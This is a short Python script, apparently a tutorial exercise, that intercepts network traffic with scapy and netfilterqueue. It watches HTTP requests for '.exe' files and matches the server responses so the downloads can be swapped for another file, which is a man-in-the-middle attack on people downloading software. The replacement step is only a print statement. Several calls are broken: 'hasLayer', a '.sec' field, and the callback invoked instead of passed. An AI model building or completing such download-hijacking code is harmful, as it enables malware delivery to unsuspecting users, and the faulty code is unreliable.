#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue

ack_list = []


def process_packet(packet):
    print(packet)
    print(packet.get_payload())

    scapy_packet = scapy.IP(packet.get_payload())  # wraps the packet into IP layer
    if scapy_packet.hasLayer(scapy.Raw):  # RAW == HTTP
        print(scapy_packet.show())  # prints all the packets with useful data (dev only)
        if scapy_packet[scapy.TCP].dport == 80:
            # print(scapy_packet.show())
            if ".exe" in scapy_packet[scapy.Raw].load:  # => # can be optimized for many file types
                print("[+] File request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # see show() for + info. response has a seq field over TCP

        elif scapy_packet[scapy.TCP].sport == 80:
            # print(scapy_packet.show())
            if scapy_packet[scapy.TCP].sec in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].sec)  # once identified we can clear the list
                print("[*] Replacing file")


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet())
queue.run()
